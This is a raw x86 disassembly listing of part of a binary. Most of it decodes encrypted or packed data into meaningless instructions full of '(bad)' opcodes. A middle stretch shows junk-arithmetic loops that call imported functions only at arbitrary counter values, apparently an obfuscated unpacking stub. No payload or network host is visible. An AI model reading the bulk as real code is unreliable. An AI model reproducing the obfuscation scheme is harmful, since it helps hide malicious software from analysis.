  411aa8:	adc    eax,0x3526f0c4
  411aad:	dec    ecx
  411aae:	sub    DWORD PTR [esi-0x33],edi
  411ab1:	sbb    eax,0x59a86f0d
  411ab6:	jl     0x411aee
  411ab8:	xchg   esp,eax
  411ab9:	or     esi,esp
  411abb:	imul   eax,DWORD PTR [ebx+0x39],0x4d
  411abf:	add    DWORD PTR [ecx-0x10d20880],ebx
  411ac5:	imul   eax,DWORD PTR [ebx-0x2fd268ee],0x2a
  411acc:	jg     0x411a52
  411ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411acf:	(bad)  
  411ad0:	pop    edx
  411ad1:	sub    ah,BYTE PTR [ebp-0x72091f93]
  411ad7:	jmp    0x443f:0x58863a2a
  411ade:	loopne 0x411adf
  411ae0:	ss dec edx
  411ae2:	test   edi,edx
  411ae4:	ror    BYTE PTR [esi+eiz*4-0x3de18e3f],0xb5
  411aec:	add    DWORD PTR [ebx-0xb],esp
  411aef:	pop    es
  411af0:	aam    0xf3
  411af2:	ds inc ebx
  411af4:	and    eax,0x6842ada8
  411af9:	sbb    DWORD PTR [ebx+ecx*8],ebx
  411afc:	lds    eax,FWORD PTR [edi+0x20]
  411aff:	popa   
  411b00:	add    eax,0x1e5a71e3
  411b05:	(bad)  
  411b06:	pop    DWORD PTR [esi-0x4]
  411b09:	push   edi
  411b0a:	aam    0x12
  411b0c:	dec    ecx
  411b0d:	pop    ss
  411b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b0f:	xchg   esp,eax
  411b10:	rol    BYTE PTR [ebp-0x6f133922],cl
  411b16:	jno    0x411b3e
  411b18:	lahf   
  411b19:	mov    al,ds:0x1f0c797b
  411b1e:	popf   
  411b1f:	(bad)  
  411b20:	push   edx
  411b21:	ss out 0x15,al
  411b24:	popw   es
  411b26:	jns    0x411b62
  411b28:	fld    QWORD PTR [ebp-0x11ad0412]
  411b2e:	jns    0x411afd
  411b30:	lahf   
  411b31:	call   0x8135cd36
  411b36:	push   esi
  411b37:	xor    DWORD PTR [ebx],eax
  411b39:	hlt    
  411b3a:	fadd   st(3),st
  411b3c:	dec    eax
  411b3d:	inc    ebp
  411b3e:	push   0x3336deef
  411b43:	push   ecx
  411b44:	repnz pop ds
  411b46:	xchg   edx,eax
  411b47:	inc    ebp
  411b48:	ror    DWORD PTR [ebp+0x5fed075b],1
  411b4e:	fdiv   st,st(1)
  411b50:	xor    eax,0x867e6e78
  411b55:	std    
  411b56:	adc    al,0x5e
  411b58:	aad    0x3b
  411b5a:	sub    ebp,DWORD PTR [ebp+0x787f7886]
  411b60:	add    al,BYTE PTR [esi+ecx*8-0x501fe8f3]
  411b67:	inc    esp
  411b68:	fadd   DWORD PTR [ebx+edx*4-0x1a]
  411b6c:	(bad)  
  411b6d:	fbld   TBYTE PTR [ebp+0xc]
  411b70:	sub    al,0xa6
  411b72:	jp     0x411b74
  411b74:	push   edx
  411b75:	inc    esi
  411b76:	mov    cl,0x38
  411b78:	jnp    0x411afb
  411b7a:	fstp   QWORD PTR [eax]
  411b7c:	lods   al,BYTE PTR ds:[esi]
  411b7d:	outs   dx,DWORD PTR ds:[esi]
  411b7e:	daa    
  411b7f:	and    ebp,eax
  411b81:	mov    cs,WORD PTR [ebp-0x7130cd14]
  411b87:	mov    al,ds:0x9c2c5a63
  411b8c:	add    al,0xa0
  411b8e:	arpl   WORD PTR [edi+edx*4+0x56],sp
  411b92:	mov    edx,0x6152a587
  411b97:	jge    0x411bdf
  411b99:	adc    BYTE PTR ds:0x16a2d799,bh
  411b9f:	pop    ebx
  411ba0:	into   
  411ba1:	mov    al,ds:0xe1f53a59
  411ba6:	mul    ebx
  411ba8:	dec    esi
  411ba9:	sub    ebp,DWORD PTR [edx-0xbe0e396]
  411baf:	cmp    DWORD PTR ds:0xc6d2d11,ecx
  411bb5:	sub    dh,dh
  411bb7:	xor    BYTE PTR [eax+0x1bf51c64],dh
  411bbd:	idiv   DWORD PTR [esi+edi*1+0x15]
  411bc1:	jne    0x411c1f
  411bc3:	jl     0x411c26
  411bc5:	iret   
  411bc6:	push   0xedbf86f4
  411bcb:	mov    ss:0xb974620b,al
  411bd1:	xchg   BYTE PTR [eax-0x7f],bl
  411bd4:	mov    al,0x56
  411bd6:	test   al,0xa4
  411bd8:	mov    eax,ds:0xd60f0627
  411bdd:	in     al,0xb6
  411bdf:	fistp  DWORD PTR [edx+0x23]
  411be2:	adc    cl,dl
  411be4:	aam    0xaa
  411be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411be7:	push   edx
  411be8:	jmp    0x69b10879
  411bed:	mov    ah,0x83
  411bef:	mov    eax,0xd5f64116
  411bf4:	shl    DWORD PTR [eax+eiz*8-0x2ca268ff],0x54
  411bfc:	(bad)  
  411bfd:	rol    BYTE PTR [ebp+0x5d0735b],1
  411c03:	shr    DWORD PTR [eax-0x16f69f1d],1
  411c09:	cmp    eax,0xe8a2daa6
  411c0e:	iret   
  411c0f:	inc    edx
  411c10:	gs jne 0x411c54
  411c13:	xchg   BYTE PTR [eax],dh
  411c15:	fisttp WORD PTR [eax-0x790b8aac]
  411c1b:	pop    eax
  411c1c:	or     edx,DWORD PTR [edi]
  411c1e:	(bad)  
  411c1f:	pop    ds
  411c20:	mov    ebx,0xfdc1a12f
  411c25:	jo     0x411bf2
  411c27:	xchg   esp,eax
  411c29:	ds aam 0x56
  411c2c:	jns    0x411c3c
  411c2e:	xchg   ecx,eax
  411c2f:	cwde   
  411c30:	cld    
  411c31:	outs   dx,DWORD PTR ds:[esi]
  411c32:	xor    dh,BYTE PTR [ecx+0xc]
  411c35:	sti    
  411c36:	pop    esp
  411c37:	add    DWORD PTR [ecx+0x41],eax
  411c3a:	xchg   esp,eax
  411c3b:	pop    ebp
  411c3c:	push   esp
  411c3d:	push   0x26e59faa
  411c42:	sub    esp,DWORD PTR [eax+0x3]
  411c45:	jns    0x411cbb
  411c47:	aas    
  411c48:	icebp  
  411c49:	shr    ah,0x88
  411c4c:	dec    esp
  411c4d:	add    al,BYTE PTR [ecx+esi*4]
  411c50:	jle    0x411c8b
  411c52:	rol    BYTE PTR [edi+0x24],1
  411c55:	xchg   DWORD PTR [ebx+ebp*4],ebp
  411c58:	adc    ebx,DWORD PTR [eax-0x6a]
  411c5b:	add    esp,eax
  411c5d:	stc    
  411c5e:	inc    ebx
  411c5f:	push   edi
  411c60:	adc    eax,0x240524ba
  411c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c66:	addr16 aaa 
  411c68:	jns    0x411ccf
  411c6a:	xchg   DWORD PTR [esi-0x13],ebx
  411c6d:	repnz popf 
  411c6f:	fsubrp st(0),st
  411c71:	lahf   
  411c72:	ja     0x411c11
  411c74:	scas   eax,DWORD PTR es:[edi]
  411c75:	arpl   si,cx
  411c77:	and    DWORD PTR [esi-0x60],0xffffffd8
  411c7b:	iret   
  411c7c:	push   eax
  411c7d:	inc    esi
  411c7e:	lock xchg esp,eax
  411c80:	into   
  411c81:	sub    DWORD PTR [eax-0x19b61f57],ebp
  411c87:	mov    ds:0x6ac9c985,al
  411c8c:	jae    0x411cf4
  411c8e:	cdq    
  411c8f:	jmp    0xff6cf6c8
  411c94:	cmp    BYTE PTR [ecx+ebp*4],bl
  411c97:	inc    ebx
  411c98:	sub    eax,0x86c4cb8c
  411c9d:	(bad)  
  411c9e:	cld    
  411c9f:	inc    ebx
  411ca0:	in     eax,dx
  411ca1:	or     DWORD PTR [ecx-0x2be09a3c],ecx
  411ca7:	and    ch,BYTE PTR [esi]
  411ca9:	popf   
  411caa:	outs   dx,DWORD PTR ds:[esi]
  411cab:	pop    ss
  411cac:	adc    ebp,edx
  411cae:	xchg   ecx,eax
  411caf:	push   0xe6eee4e0
  411cb4:	js     0x411cde
  411cb6:	mov    ah,0xde
  411cb8:	out    0xc,eax
  411cba:	inc    eax
  411cbb:	and    BYTE PTR [eax],dh
  411cbd:	inc    esi
  411cbe:	popf   
  411cbf:	stos   DWORD PTR es:[edi],eax
  411cc0:	jns    0x411c83
  411cc2:	xchg   ebx,eax
  411cc3:	in     al,dx
  411cc4:	pop    ds
  411cc5:	add    BYTE PTR [ebx-0x53fa56d0],ah
  411ccb:	pushf  
  411ccc:	aas    
  411ccd:	add    eax,0x54855ff9
  411cd2:	test   DWORD PTR [edx+0xd],esi
  411cd5:	mov    cl,0xb5
  411cd7:	in     eax,dx
  411cd8:	mov    ecx,0xc3054f00
  411cdd:	ss dec edx
  411cdf:	cmp    eax,0x650500c2
  411ce4:	push   ss
  411ce5:	ds mov ecx,0xbe98c763
  411ceb:	mov    dh,0x50
  411ced:	sahf   
  411cee:	ins    BYTE PTR es:[edi],dx
  411cef:	dec    ebp
  411cf0:	ins    DWORD PTR es:[edi],dx
  411cf1:	jecxz  0x411d38
  411cf3:	call   0x49b32447
  411cf8:	test   eax,0xef78bac3
  411cfd:	pop    ebx
  411cfe:	push   edx
  411cff:	repnz add eax,0x51d5904
  411d05:	or     al,0xc1
  411d07:	sar    DWORD PTR [edi],1
  411d09:	repz retf 
  411d0b:	lods   al,BYTE PTR ds:[esi]
  411d0c:	dec    esi
  411d0d:	adc    BYTE PTR [edx+0x5b],bh
  411d10:	and    eax,DWORD PTR [esi+0x2ae793bb]
  411d16:	sub    DWORD PTR [esi+eax*1+0xf1ed712],ebx
  411d1d:	jo     0x411d35
  411d1f:	cwde   
  411d20:	cli    
  411d21:	enter  0x3469,0x9c
  411d25:	cwde   
  411d26:	and    esi,ebx
  411d28:	cli    
  411d29:	or     dh,cl
  411d2b:	fnsetpm(287 only) 
  411d2d:	iret   
  411d2e:	xchg   ecx,eax
  411d2f:	and    eax,DWORD PTR [edx+ebp*1-0x2f]
  411d33:	repnz setae bl
  411d37:	xor    DWORD PTR [ecx],eax
  411d39:	not    ch
  411d3b:	cmc    
  411d3c:	xor    eax,0x4320c9e2
  411d41:	lock mov ch,0x4a
  411d44:	push   0x5d
  411d46:	add    bl,BYTE PTR [ebp+0x0]
  411d49:	fcom   st(0)
  411d4b:	adc    cl,ah
  411d4d:	pop    ebx
  411d4e:	xchg   edi,eax
  411d4f:	retf   0xe137
  411d52:	aas    
  411d53:	shl    BYTE PTR [edi+0x1a],cl
  411d56:	mov    esi,0x8bf09f6c
  411d5b:	jo     0x411cf5
  411d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d5e:	rol    DWORD PTR [edx-0x386a5be3],cl
  411d64:	sbb    eax,0xcc06f275
  411d69:	add    DWORD PTR [edi-0x3b],eax
  411d6c:	push   ecx
  411d6d:	xor    DWORD PTR [edi],ebx
  411d6f:	repnz add BYTE PTR [ebp+0x3619b82a],0x77
  411d77:	mov    ebx,0x729408a0
  411d7c:	xor    eax,0xec88403d
  411d81:	bound  eax,QWORD PTR [edi+ebx*2]
  411d84:	aas    
  411d85:	xor    al,0x9a
  411d87:	dec    esi
  411d88:	ss jne 0x411e03
  411d8b:	mov    edi,0x31b58cda
  411d90:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411d92:	pop    edi
  411d93:	pop    ds
  411d94:	xor    DWORD PTR [eax],ebp
  411d96:	dec    esp
  411d97:	adc    BYTE PTR [ebx+0xc],dh
  411d9a:	jg     0x411e15
  411d9c:	pop    eax
  411d9d:	pusha  
  411d9e:	(bad)  
  411d9f:	ss in  eax,dx
  411da1:	cwde   
  411da2:	xchg   ebx,eax
  411da3:	xor    eax,DWORD PTR [eax]
  411da5:	out    dx,al
  411da6:	cli    
  411da7:	call   DWORD PTR [eax+0x44]
  411daa:	jecxz  0x411d6b
  411dac:	mov    eax,DWORD PTR [eax-0x66]
  411daf:	(bad)
  411db2:	push   edx
  411db3:	mov    ebp,0x3343ab08
  411db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db9:	cld    
  411dba:	dec    ecx
  411dbb:	les    edi,FWORD PTR [edi+ebp*8+0x7d03f5b6]
  411dc2:	ror    dh,0xaa
  411dc5:	daa    
  411dc6:	scas   eax,DWORD PTR es:[edi]
  411dc7:	xchg   ecx,eax
  411dc8:	pop    ecx
  411dc9:	jne    0x411d8d
  411dcb:	je     0x411e08
  411dcd:	sbb    edx,DWORD PTR [eax]
  411dcf:	push   eax
  411dd0:	mov    ch,0xcd
  411dd2:	scas   eax,DWORD PTR es:[edi]
  411dd3:	repnz and DWORD PTR [eax+0x5],esp
  411dd7:	mov    cs,esp
  411dd9:	call   0x53ca6052
  411dde:	fld    DWORD PTR [eax+esi*2+0x3b7c6c36]
  411de5:	fadd   QWORD PTR [ecx-0x4d]
  411de8:	xor    al,0x89
  411dea:	rcl    DWORD PTR [edi+0x7012653e],1
  411df0:	fcmovnb st,st(2)
  411df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df3:	mov    ds:0xa4aafa3e,eax
  411df8:	icebp  
  411df9:	mov    bh,0x24
  411dfb:	jnp    0x411e6d
  411dfd:	pop    esi
  411dfe:	mov    ch,0x51
  411e00:	ins    DWORD PTR es:[edi],dx
  411e01:	xchg   ebp,eax
  411e02:	add    al,BYTE PTR [edx+esi*4-0x2405cdef]
  411e09:	or     al,0xde
  411e0b:	pop    ds
  411e0c:	mov    bl,0xfb
  411e0e:	ds jmpw 0xb37e
  411e13:	add    al,0x2b
  411e15:	outs   dx,BYTE PTR ds:[esi]
  411e16:	repnz dec edi
  411e18:	jmp    FWORD PTR [edx+0x10]
  411e1b:	xor    al,0x3e
  411e1d:	lock xor al,BYTE PTR [edi+esi*1-0x363823ec]
  411e25:	ins    BYTE PTR es:[edi],dx
  411e26:	add    eax,0xe0225361
  411e2b:	or     dl,ch
  411e2d:	cmp    bh,BYTE PTR [ecx+0x6a]
  411e30:	test   eax,0x45c35877
  411e35:	mov    esi,0xb153db5d
  411e3a:	dec    esi
  411e3b:	in     al,dx
  411e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e3d:	ror    al,1
  411e3f:	(bad)  
  411e40:	call   FWORD PTR [edx]
  411e42:	add    ecx,DWORD PTR [ebp-0x29]
  411e45:	test   bh,0xeb
  411e48:	jmp    0x411e19
  411e4a:	arpl   WORD PTR [ecx-0x13],ax
  411e4d:	test   BYTE PTR [ebx-0x2cc4ff0a],0xf
  411e54:	test   DWORD PTR [eax+eax*1],ebx
  411e57:	add    BYTE PTR [eax],al
  411e59:	mov    DWORD PTR ds:0x42900c,0x30b0
  411e63:	cmp    esi,edi
  411e65:	mov    DWORD PTR ds:0x42d000,0x643
  411e6f:	je     0x411edc
  411e75:	sub    edx,0x6beb
  411e7b:	mov    edx,DWORD PTR ds:0x423f9a
  411e81:	mov    edx,DWORD PTR [edx+0x1c0]
  411e87:	mov    edx,DWORD PTR [edx]
  411e89:	sub    DWORD PTR ds:0x42c018,0x42901c
  411e93:	xor    esi,esi
  411e95:	add    edx,ecx
  411e97:	adc    esi,0xffffffff
  411e9a:	xor    edx,eax
  411e9c:	and    DWORD PTR ds:0x42d010,0x4e39
  411ea6:	xor    esi,0x0
  411ea9:	mov    DWORD PTR ds:0x42a018,0x6a83
  411eb3:	cmp    edx,0x70941fd1
  411eb9:	mov    DWORD PTR ds:0x42d014,0x6414
  411ec3:	jne    0x411f46
  411ec9:	mov    DWORD PTR ds:0x42b000,0x2399
  411ed3:	cmp    esi,0xffffffff
  411ed6:	jne    0x411f46
  411edc:	mov    edx,DWORD PTR ds:0x42401e
  411ee2:	mov    esi,DWORD PTR ds:0x424016
  411ee8:	xor    edx,esi
  411eea:	mov    DWORD PTR ds:0x424016,edx
  411ef0:	mov    edx,DWORD PTR [ebp+0xc]
  411ef3:	mov    edx,DWORD PTR [edx]
  411ef5:	mov    edx,DWORD PTR [edx]
  411ef7:	mov    esi,DWORD PTR ds:0x424016
  411efd:	add    DWORD PTR [edx],esi
  411eff:	mov    esi,DWORD PTR [ebp+0x8]
  411f02:	mov    edx,DWORD PTR ds:0x424016
  411f08:	xor    esi,0x7510893
  411f0e:	add    esi,0x3272db
  411f14:	xor    ebx,ebx
  411f16:	add    esi,ecx
  411f18:	adc    ebx,0xffffffff
  411f1b:	xor    edi,edi
  411f1d:	xor    esi,eax
  411f1f:	xor    ebx,0x0
  411f22:	add    edx,ecx
  411f24:	adc    edi,0xffffffff
  411f27:	xor    edx,eax
  411f29:	xor    edi,0x0
  411f2c:	cmp    edx,esi
  411f2e:	jne    0x411f46
  411f34:	cmp    edi,ebx
  411f36:	jne    0x411f46
  411f3c:	mov    eax,ds:0x424016
  411f41:	mov    ds:0x42401e,eax
  411f46:	pop    edi
  411f47:	pop    esi
  411f48:	pop    ebx
  411f49:	pop    ebp
  411f4a:	ret    0x8
  411f4d:	push   ebp
  411f4e:	mov    ebp,esp
  411f50:	sub    esp,0x90
  411f56:	add    DWORD PTR ds:0x42a01c,0x734d
  411f60:	push   esi
  411f61:	xor    ecx,0xb67
  411f67:	push   edi
  411f68:	xor    eax,DWORD PTR ds:0x42a018
  411f6e:	mov    eax,ds:0x423f9a
  411f73:	add    esi,0x4c8c
  411f79:	mov    DWORD PTR [ebp-0x2c],eax
  411f7c:	xor    ecx,0x3033
  411f82:	mov    eax,ds:0x4240a6
  411f87:	and    DWORD PTR ds:0x42a010,0x0
  411f91:	mov    esi,DWORD PTR ds:0x42a010
  411f97:	inc    esi
  411f98:	mov    DWORD PTR ds:0x42a010,esi
  411f9e:	cmp    DWORD PTR ds:0x42a010,0xd
  411fa5:	jne    0x411fbe
  411fab:	push   0x1106
  411fb0:	push   DWORD PTR [ebp-0xc]
  411fb3:	push   0x571c
  411fb8:	call   DWORD PTR ds:0x425044
  411fbe:	cmp    DWORD PTR ds:0x42a010,0xc
  411fc5:	jne    0x411fda
  411fcb:	xor    esi,esi
  411fcd:	add    esi,DWORD PTR ds:0x42a010
  411fd3:	inc    esi
  411fd4:	mov    DWORD PTR ds:0x42a010,esi
  411fda:	cmp    DWORD PTR ds:0x42a010,0x14
  411fe1:	jb     0x411f91
  411fe7:	mov    DWORD PTR [ebp-0x3c],eax
  411fea:	and    DWORD PTR ds:0x42b004,edx
  411ff0:	and    DWORD PTR [ebp-0x34],0x0
  411ff4:	xor    ecx,DWORD PTR ds:0x42d010
  411ffa:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  412001:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  412008:	and    edi,DWORD PTR ds:0x42b018
  41200e:	mov    eax,DWORD PTR [ebp-0x1c]
  412011:	mov    ecx,DWORD PTR [ebp-0x1c]
  412014:	xor    edi,DWORD PTR ds:0x42b004
  41201a:	xor    eax,ecx
  41201c:	add    DWORD PTR ds:0x429018,ecx
  412022:	mov    DWORD PTR [ebp-0x1c],eax
  412025:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  41202c:	sub    ecx,esi
  41202e:	mov    eax,DWORD PTR [ebp-0x28]
  412031:	mov    DWORD PTR ds:0x42a010,0x1d
  41203b:	cmp    DWORD PTR ds:0x42a010,0x0
  412042:	je     0x4120a2
  412048:	cmp    DWORD PTR ds:0x42a010,0x4
  41204f:	jne    0x412069
  412055:	push   DWORD PTR [ebp-0x1c]
  412058:	push   0x61a2
  41205d:	push   DWORD PTR [ebp-0x1c]
  412060:	push   DWORD PTR [ebp-0x18]
  412063:	call   DWORD PTR ds:0x425048
  412069:	cmp    DWORD PTR ds:0x42a010,0x5
  412070:	jne    0x412083
  412076:	mov    ecx,DWORD PTR ds:0x42a010
  41207c:	dec    ecx
  41207d:	mov    DWORD PTR ds:0x42a010,ecx
  412083:	mov    ecx,DWORD PTR ds:0x42a010
  412089:	dec    ecx
  41208a:	mov    DWORD PTR ds:0x42a010,ecx
  412090:	jmp    0x41203b
  412095:	movzx  esi,BYTE PTR ds:0x42b010
  41209c:	sub    DWORD PTR ds:0x42c008,esi
  4120a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4120a5:	sub    edi,esi
  4120a7:	xor    eax,ecx
  4120a9:	mov    DWORD PTR [ebp-0x28],eax
  4120ac:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4120b3:	and    DWORD PTR ds:0x42b000,0x0
  4120bd:	mov    eax,ds:0x42b000
  4120c2:	inc    eax
  4120c3:	mov    ds:0x42b000,eax
  4120c8:	cmp    DWORD PTR ds:0x42b000,0x1d
  4120cf:	jne    0x4120de
  4120d5:	push   DWORD PTR [ebp-0x10]
  4120d8:	call   DWORD PTR ds:0x42504c
  4120de:	cmp    DWORD PTR ds:0x42b000,0x16
  4120e5:	jb     0x4120bd
  4120eb:	mov    DWORD PTR ds:0x429018,0x1a
  4120f5:	cmp    DWORD PTR ds:0x429018,0x0
  4120fc:	je     0x412149
  412102:	cmp    DWORD PTR ds:0x429018,0x9
  412109:	jne    0x41211d
  41210f:	push   DWORD PTR [ebp-0x10]
  412112:	push   0x42444a
  412117:	call   DWORD PTR ds:0x425010
  41211d:	cmp    DWORD PTR ds:0x429018,0xa
  412124:	jne    0x412137
  41212a:	mov    ecx,DWORD PTR ds:0x429018
  412130:	dec    ecx
  412131:	mov    DWORD PTR ds:0x429018,ecx
  412137:	mov    ecx,DWORD PTR ds:0x429018
  41213d:	dec    ecx
  41213e:	mov    DWORD PTR ds:0x429018,ecx
  412144:	jmp    0x4120f5
  412149:	mov    eax,DWORD PTR [ebp-0x18]
  41214c:	adc    ecx,esi
  41214e:	mov    ecx,DWORD PTR [ebp-0x18]
  412151:	xor    eax,ecx
  412153:	xor    esi,esi
  412155:	xor    esi,DWORD PTR ds:0x429028
  41215b:	sbb    DWORD PTR ds:0x429014,esi
  412161:	mov    DWORD PTR [ebp-0x18],eax
  412164:	mov    ecx,DWORD PTR ds:0x423da6
  41216a:	mov    eax,ds:0x424309
  41216f:	sub    ecx,eax
  412171:	imul   ecx,DWORD PTR [ecx+eax*1]
  412175:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  41217c:	mov    DWORD PTR ds:0x42a018,0x18
  412186:	cmp    DWORD PTR ds:0x42a018,0x0
  41218d:	je     0x4121c0
  412193:	cmp    DWORD PTR ds:0x42a018,0x1b
  41219a:	jne    0x4121ac
  4121a0:	push   DWORD PTR [ebp-0x1c]
  4121a3:	push   DWORD PTR [ebp-0x18]
  4121a6:	call   DWORD PTR ds:0x425018
  4121ac:	xor    esi,esi
  4121ae:	or     esi,DWORD PTR ds:0x42a018
  4121b4:	dec    esi
  4121b5:	mov    DWORD PTR ds:0x42a018,esi
  4121bb:	jmp    0x412186
  4121c0:	mov    eax,DWORD PTR [ebp-0x24]
  4121c3:	or     DWORD PTR ds:0x429014,0x2eb5
  4121cd:	mov    ecx,DWORD PTR [ebp-0x24]
  4121d0:	mov    DWORD PTR ds:0x429000,0x1b
  4121da:	cmp    DWORD PTR ds:0x429000,0x0
  4121e1:	je     0x412218
  4121e7:	cmp    DWORD PTR ds:0x429000,0x2a
  4121ee:	jne    0x412206
  4121f4:	push   0x42901c
  4121f9:	push   0x0
  4121fb:	push   0x424338
  412200:	call   DWORD PTR ds:0x42501c
  412206:	mov    esi,DWORD PTR ds:0x429000
  41220c:	dec    esi
  41220d:	mov    DWORD PTR ds:0x429000,esi
  412213:	jmp    0x4121da
  412218:	xor    eax,ecx
  41221a:	mov    DWORD PTR [ebp-0x24],eax
  41221d:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  412224:	sbb    eax,DWORD PTR ds:0x429004
  41222a:	mov    eax,DWORD PTR [ebp-0x14]
  41222d:	sub    DWORD PTR ds:0x429018,ecx
  412233:	mov    ecx,DWORD PTR [ebp-0x14]
  412236:	and    DWORD PTR ds:0x42d014,0x19f0
  412240:	xor    eax,ecx
  412242:	mov    DWORD PTR [ebp-0x14],eax
  412245:	mov    eax,DWORD PTR [ebp-0x20]
  412248:	mov    ecx,DWORD PTR [ebp-0x14]
  41224b:	dec    esi
  41224c:	mov    esi,0x7510893
  412251:	and    DWORD PTR ds:0x42a01c,0x5143
  41225b:	xor    eax,esi
  41225d:	and    DWORD PTR ds:0x42a004,0x0
  412267:	jmp    0x41227b
  41226c:	xor    edi,edi
  41226e:	add    edi,DWORD PTR ds:0x42a004
  412274:	inc    edi
  412275:	mov    DWORD PTR ds:0x42a004,edi
  41227b:	cmp    DWORD PTR ds:0x42a004,0x15
  412282:	jae    0x4122c2
  412288:	cmp    DWORD PTR ds:0x42a004,0x5
  41228f:	jne    0x4122a3
  412295:	push   0x42c018
  41229a:	push   DWORD PTR [ebp-0x24]
  41229d:	call   DWORD PTR ds:0x425020
  4122a3:	cmp    DWORD PTR ds:0x42a004,0x4
  4122aa:	jne    0x4122bd
  4122b0:	mov    edi,DWORD PTR ds:0x42a004
  4122b6:	inc    edi
  4122b7:	mov    DWORD PTR ds:0x42a004,edi
  4122bd:	jmp    0x41226c
  4122c2:	mov    edi,0x3272db
  4122c7:	add    eax,edi
  4122c9:	xor    eax,ecx
  4122cb:	mov    DWORD PTR [ebp-0x14],eax
  4122ce:	mov    eax,DWORD PTR [ebp-0x10]
  4122d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4122d4:	sub    eax,ecx
  4122d6:	mov    DWORD PTR [ebp-0x10],eax
  4122d9:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4122e0:	mov    al,BYTE PTR [ebp-0x1]
  4122e3:	movzx  ecx,BYTE PTR [ebp-0x1]
  4122e7:	movzx  eax,al
  4122ea:	sub    ecx,eax
  4122ec:	mov    BYTE PTR [ebp-0x1],cl
  4122ef:	movzx  eax,BYTE PTR [ebp-0x1]
  4122f3:	xor    eax,0xffffff99
  4122f6:	mov    BYTE PTR [ebp-0x1],al
  4122f9:	mov    eax,DWORD PTR [ebp-0x20]
  4122fc:	xor    eax,esi
  4122fe:	add    eax,edi
  412300:	mov    DWORD PTR [ebp-0x14],eax
  412303:	lea    eax,[ebp-0x40]
  412306:	mov    DWORD PTR [ebp-0x38],eax
  412309:	lea    eax,[ebp-0x38]
  41230c:	mov    DWORD PTR [ebp-0x44],eax
  41230f:	lea    eax,[ebp-0x44]
  412312:	mov    DWORD PTR [ebp-0x8],eax
  412315:	lea    eax,[ebp-0x8]
  412318:	mov    DWORD PTR [ebp-0x48],eax
  41231b:	mov    eax,DWORD PTR [ebp-0x18]
  41231e:	jmp    0x41466d
  412323:	test   cl,dl
  412325:	icebp  
  412326:	arpl   WORD PTR gs:[ebp+0x64],sp
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	push   0x5ff94cc8
  412330:	lds    ebx,FWORD PTR ds:0x626bde3e
  412336:	bound  edx,QWORD PTR [eax+0x5f]
  412339:	bound  esp,QWORD PTR [edx-0x3e]
  41233c:	and    dl,BYTE PTR [edi]
  41233e:	scas   al,BYTE PTR es:[edi]
  41233f:	(bad)  
  412340:	les    esi,FWORD PTR [eax-0x3b]
  412343:	cmp    DWORD PTR [esi],eax
  412345:	fist   DWORD PTR [eax]
  412347:	ss push ebp
  412349:	xchg   edx,edi
  41234b:	lds    edi,FWORD PTR [edi]
  41234d:	pop    edi
  41234e:	dec    ebx
  41234f:	mov    edx,0x90d1abba
  412354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412355:	shl    BYTE PTR [esi-0x47b16a76],0x44
  41235c:	test   BYTE PTR [ebx],dl
  41235e:	jmp    0xfd4f:0x65bc8c61
  412365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412366:	gs int 0x25
  412369:	cdq    
  41236a:	push   esi
  41236b:	ds inc edi
  41236d:	lods   al,BYTE PTR ds:[esi]
  41236e:	jmp    0x4de046cc
  412373:	jecxz  0x4123d1
  412375:	syscall 
  412377:	es mov edi,0x278a2925
  41237d:	leave  
  41237e:	mov    ecx,0x719a6633
  412383:	fxch   st(6)
  412385:	inc    ecx
  412386:	pop    es
  412387:	loopne 0x4123ee
  412389:	gs xchg ebp,eax
  41238b:	xor    al,0xce
  41238d:	sub    BYTE PTR [ebp-0x2b3d0852],ah
  412393:	jmp    0x73df212e
  412398:	ins    BYTE PTR es:[edi],dx
  412399:	adc    esp,ebp
  41239b:	sub    dl,BYTE PTR [ebp+0x580a34bc]
  4123a1:	es in  al,dx
  4123a3:	adc    BYTE PTR [ecx-0x7c9c7d9e],dl
  4123a9:	mov    DWORD PTR [edi+0x66928a40],edi
  4123af:	xchg   esi,eax
  4123b0:	stc    
  4123b1:	retf   
  4123b2:	inc    esi
  4123b3:	mov    ebp,ebx
  4123b5:	mov    ebp,0xe79c4349
  4123ba:	sbb    al,0x10
  4123bc:	mov    bh,0x76
  4123be:	sub    ah,BYTE PTR [ebx+0x2ef48867]
  4123c4:	sti    
  4123c5:	sub    esp,esp
  4123c7:	es sub edx,DWORD PTR gs:[edx]
  4123cb:	mov    eax,ds:0xa38f15a8
  4123d0:	sub    BYTE PTR [edi],cl
  4123d2:	cmp    al,bl
  4123d4:	arpl   WORD PTR [esi+0x6e5960cc],cx
  4123da:	fdivr  DWORD PTR [ebx]
  4123dc:	xchg   edx,eax
  4123dd:	retf   0x3f4
  4123e0:	jge    0x4123f9
  4123e2:	imul   esp,DWORD PTR [ebp+edi*2+0x11],0x990e35e6
  4123ea:	xchg   ebx,eax
  4123eb:	xchg   ebx,eax
  4123ec:	and    al,0x73
  4123ee:	rcl    BYTE PTR [esi+0x5dfa9fe],0x17
  4123f5:	xor    DWORD PTR [edi],eax
  4123f7:	fmul   st,st(2)
  4123f9:	pop    eax
  4123fa:	mov    edx,DWORD PTR [esi+0x2]
  4123fd:	sbb    eax,0x6ac37587
  412402:	or     eax,0xefcce512
  412407:	and    DWORD PTR [ecx],ebp
  412409:	mov    cl,0xaa
  41240b:	jmp    0x4123f7
  41240d:	nop
  41240e:	mov    ah,0x5e
